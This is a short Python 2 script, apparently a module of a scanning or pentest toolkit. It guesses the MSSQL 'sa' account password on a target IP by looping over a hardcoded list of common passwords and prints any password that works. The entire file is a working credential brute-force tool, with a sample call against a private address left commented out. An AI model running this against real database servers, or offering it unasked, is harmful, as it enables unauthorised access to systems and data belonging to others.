#!/usr/bin/python
#coding:utf-8

def mssql(ip='',port='1433',name='',productname=''):
    head=''
    ans=None
    keywords=''
    hackinfo=''
    import pymssql,chardet
    con=None
    passwd=['root','123456','admin','','12345','111111','password','123123','1234','12345678','123456789','123',
            'abc123','qwerty']
    for i in passwd:
        try:
            con = pymssql.connect(host=ip,user='sa',password=i,login_timeout=5)  
            hackinfo= ' the password is :'+i
            print ip+hackinfo
            keywords='mssql'
            break;
        except Exception,e:

            keywords='mssql'
            hackinfo=str(e)
            if 'sa' in hackinfo:
                print 'yes'
            chardit1 = chardet.detect(hackinfo)
            print hackinfo.decode(chardit1['encoding']).encode('utf8')
            
        finally:
            if con !=None:
                con.close()
    return head,ans,keywords,hackinfo
# print mssql(ip='192.168.1.100')